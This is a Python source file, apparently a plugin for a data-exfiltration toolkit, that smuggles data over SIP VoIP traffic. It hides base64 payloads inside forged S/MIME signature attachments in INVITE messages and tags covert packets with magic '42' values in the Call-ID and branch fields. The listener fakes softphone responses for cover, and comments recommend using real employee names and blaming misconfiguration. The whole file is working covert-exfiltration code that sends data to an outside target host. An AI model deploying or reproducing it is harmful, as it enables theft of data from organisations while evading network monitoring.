#!/usr/bin/env python

#inspired from: https://books.google.fr/books?id=cHOmCwAAQBAJ&pg=PA747&lpg=PA747&dq=sdp+smime&source=bl&ots=34LYW5iJyc&sig=4a1szVXKMDtqQWUb0K2gM29AgL8&hl=fr&sa=X&ved=0ahUKEwjbm5Tf1JzTAhUGfxoKHX-UCQUQ6AEIVTAG#v=onepage&q=sdp%20smime&f=false

from dpkt import sip
import socket
import string
import random
import base64
import re
import traceback

config = None
app_exfiltrate = None

#Ideally replace with real employee names
names = ('alice', 'bob', 'eve', 'kim', 'lorrie', 'ben')
caller, callee = random.sample(names, 2)

#proxy  = "freephonie.net" #Might as well be internal PBX
#domain = 'e.corp'

class UserAgent:

    def __init__(self, alias, ip, port=None, user_agent=None):
        self.alias = alias
        self.ip = ip
        self.port = port
        self.user_agent = 'Linphone/3.6.1 (eXosip2/4.1.0)'
        self.tag = ''.join(random.sample(string.digits, 10))

class SIPDialog:

    def __init__(self, uac=None, uas=None, proxy=None):
        self.call_id = ''.join(random.sample(string.digits,  8))
        self.uac = uac
        self.uas = uas
        self.branch = 'z9hG4bK' + ''.join(random.sample(string.digits, 10))
        self.proxy = proxy
        self.subject = "Phone call"

    def init_from_request(self, req):
        self.call_id = req.headers['call-id']
        parser = re.compile('<sip:(.*)@(.*)>;tag=(.*)')
        [(s_alias, s_ip, tag)] = re.findall(parser, req.headers['from'])
        parser = re.compile('SIP\/2\.0\/UDP (.*):(\d*)(?:\;rport.*)?\;branch=(.*)')
        [(proxy, s_port, branch)] = re.findall(parser, req.headers['via'])
        parser = re.compile('<sip:(.*)@(.*)>')
        [(c_alias, c_ip)] = re.findall(parser, req.headers['to'])
        user_agent = req.headers['user-agent']

        self.tag = tag
        self.branch = branch
        self.uac = UserAgent(c_alias, c_ip)
        self.uas = UserAgent(s_alias, s_ip, port=s_port, user_agent=user_agent)
        self.proxy = proxy

    def invite(self, uac, uas, payload):
        #Call-ID magic identifier
        self.call_id = self.call_id[:3] + "42" + self.call_id[5:]
        #Branch magic identifier
        self.branch = self.branch[:11] + "42" + self.branch[13:]
        self.uac = uac
        self.uas = uas
        self.proxy = self.proxy or '127.0.0.1' #keep calm & blame misconfiguration
        packet = sip.Request()
        #forge headers
        packet.uri = 'sip:' + self.uas.alias + '@'+ self.uas.ip
        packet.headers['Via'] = 'SIP/2.0/UDP {}:{};branch={}'.format(self.proxy, self.uac.port, self.branch)
        packet.headers['Max-Forwards'] = 70
        packet.headers['CSeq'] = '20 ' + packet.method
        packet.headers['From'] = '{} <sip:{}@{}>;tag={}'.format(self.uac.alias.capitalize(), self.uac.alias, self.uac.ip, self.uac.tag)
        packet.headers['To'] = '{} <sip:{}@{}>'.format(self.uas.alias.capitalize(), self.uas.alias, self.uas.ip)
        packet.headers['Contact'] = '<sip:{}@{}>'.format(self.uac.alias, self.uac.ip)
        packet.headers['Call-ID'] = self.call_id
        packet.headers['User-Agent'] = self.uac.user_agent
        packet.headers['Subject'] = self.subject
        packet.headers['Content-Type'] = 'application/sdp'
        packet.headers['Allow'] = 'INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, NOTIFY, MESSAGE, SUBSCRIBE, INFO'
        #forge the sdp message
        sdp_content =  "v=0\r\n"
        sdp_content += "o=" + self.uac.alias + " 99 939 IN IP4 " + self.uac.ip + "\r\n"
        sdp_content += "s=Talk\r\n"
        sdp_content += "c=IN IP4 " + self.uac.ip + "\r\n"
        sdp_content += "t=0 0\r\n"
        sdp_content += "m=audio 7078 RTP/AVP 124 111 110 0 8 101\r\n"
        sdp_content += "a=rtpmap:124 opus/48000\r\n"
        sdp_content += "a=fmtp:124 useinbandfec=1; usedtx=1\r\n"
        sdp_content += "a=rtpmap:111 speex/16000\r\n"
        sdp_content += "a=fmtp:111 vbr=on\r\n"
        sdp_content += "a=rtpmap:110 speex/8000\r\n"
        sdp_content += "a=fmtp:110 vbr=on\r\n"
        sdp_content += "a=rtpmap:101 telephone-event/8000\r\n"
        sdp_content += "a=fmtp:101 0-11\r\n"
        sdp_content += "m=video 9078 RTP/AVP 103 99\r\n"
        sdp_content += "a=rtpmap:103 VP8/90000\r\n"
        sdp_content += "a=rtpmap:99 MP4V-ES/90000\r\n"
        sdp_content += "a=fmtp:99 profile-level-id=3\r\n"
        #forge sdp header
        sdp_hdr = "Content-Type: message/sip\r\n"
        sdp_hdr += "Content-Length: " + str(len(sdp_content)) + '\r\n'
        sdp_hdr += "INVITE sip:{}@{} SIP/2.0".format(self.uas.alias, self.uas.ip)
        sdp_hdr += packet.pack_hdr()
        sdp_hdr += "\r\n"
        #forge the false signature
        sig = 'Content-Type: application/x-pkcs7-signature; name="smime.p7s"\r\n'
        sig += 'Content-Transfer-Encoding: base64\r\n'
        sig += 'Content-Disposition: attachment; filename="smime.p7s"; handling=required\r\n'
        sig += base64.b64encode(payload)
        #forge sip body
        boundary = ''.join(random.sample(string.digits + string.ascii_letters, 20))
        packet.body = '--' + boundary + '\r\n'
        packet.body += sdp_hdr
        packet.body += sdp_content + '\r\n'
        packet.body += '--' + boundary + '\r\n'
        packet.body += sig + '\r\n'
        packet.body += '--' + boundary + '--'
        #replace sip header content-type with multipart/signed
        packet.headers['Content-Type'] = 'multipart/signed; protocol="application/x-pkcs7-signature"; micalg=sha1; boundary=' + boundary
        #Update Content-Length
        packet.headers['Content-Length'] = str(len(packet.body))

        return packet

    def trying(self, invite):
        packet = sip.Response()
        packet.status = '100'
        packet.reason = 'Trying'
        packet.headers['Via'] = invite.headers['via']
        packet.headers['From'] = invite.headers['from']
        packet.headers['To'] = invite.headers['to']
        packet.headers['Call-ID'] = invite.headers['call-id']
        packet.headers['CSeq'] = invite.headers['cseq']
        packet.headers['User-Agent'] = self.uac.user_agent
        packet.headers['Content-Length'] = '0'

        return packet

    def ringing(self, invite):
        packet = sip.Response()
        packet.status = '180'
        packet.reason = 'Ringing'
        packet.headers['Via'] = invite.headers['via']
        packet.headers['From'] = invite.headers['from']
        packet.headers['To'] = invite.headers['to'] + ';tag={}'.format(self.uac.tag)
        packet.headers['Call-ID'] = invite.headers['call-id']
        packet.headers['CSeq'] = invite.headers['cseq']
        packet.headers['Contact'] = '<sip:{}@{}>'.format(self.uac.alias, self.uac.ip)
        packet.headers['User-Agent'] = self.uac.user_agent
        packet.headers['Content-Length'] = '0'

        return packet

    def decline(self, invite):
        packet = sip.Response()
        packet.status = '603'
        packet.reason = 'Decline'
        packet.headers['From'] = invite.headers['from']
        packet.headers['To'] = invite.headers['to'] + ';tag={}'.format(self.uac.tag)
        packet.headers['Call-ID'] = invite.headers['call-id']
        packet.headers['CSeq'] = invite.headers['cseq']
        packet.headers['User-Agent'] = self.uac.user_agent
        packet.headers['Content-Length'] = '0'

        return packet

    def ack(self, message):
        packet = sip.Request()
        packet.method = 'ACK'
        packet.uri = 'sip:{}@{}'.format(self.uas.alias, self.uas.ip)
        packet.headers['Via'] = message.headers['via']
        packet.headers['From'] = message.headers['from']
        packet.headers['To'] = message.headers['to']
        packet.headers['Call-ID'] = message.headers['call-id']
        packet.headers['CSeq'] = '20 ACK'
        packet.headers['Content-Length'] = '0'

        return packet

def listen():
    port = config['port']
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', port))
    while True:
        data, addr = sock.recvfrom(65535)
        try:
            req = sip.Request()
            req.unpack(data)
            if req.method == 'INVITE':
                dialog = SIPDialog()
                dialog.init_from_request(req)
                #Simulate legit softphone responses
                trying = dialog.trying(req)
                sock.sendto(trying.pack(), addr)
                ringing = dialog.ringing(req)
                sock.sendto(ringing.pack(), addr)
                decline = dialog.decline(req)
                sock.sendto(decline.pack(), addr)
                #Check if the request is part of exfiltration job
                if dialog.branch[11:13] == "42" and dialog.call_id[3:5] == "42":
                    parser = re.compile('boundary=(.*)')
                    [boundary] = re.findall(parser, req.headers['content-type'])
                    #Hackish payload isolation
                    payload = req.body.split('--'+boundary)[-2].split('\r\n')[-2]
                    app_exfiltrate.retrieve_data(base64.b64decode(payload))
        except Exception as e:
            print traceback.format_exc()
            print 'exception: ' + repr(e)
            pass

def send(data):
    if config.has_key('proxies') and config['proxies'] != [""]:
        targets = [config['target']] + config['proxies']
        target = choice(targets)
    else:
        target = config['target']
    port = config['port']
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', port))
    dialog = SIPDialog()
    laddr = socket.gethostbyname(socket.getfqdn())
    uac = UserAgent(caller, laddr, port=port)
    uas = UserAgent(callee, target, port=port)
    invite = dialog.invite(uac, uas, data)
    sock.sendto(invite.pack(), (target, port))
    while True:
        try:
            recv_data, addr = sock.recvfrom(65535)
            response = sip.Response()
            response.unpack(recv_data)
            if response.reason == 'Decline':
                ack = dialog.ack(response)
                sock.sendto(ack.pack(), (target, port))
                sock.close()
                break
            else:
                continue
        except:
            pass
        break

def proxy():
    pass

class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config
        app_exfiltrate = app
        config = conf
        app.register_plugin('sip', {'send': send, 'listen': listen, 'proxy': proxy})
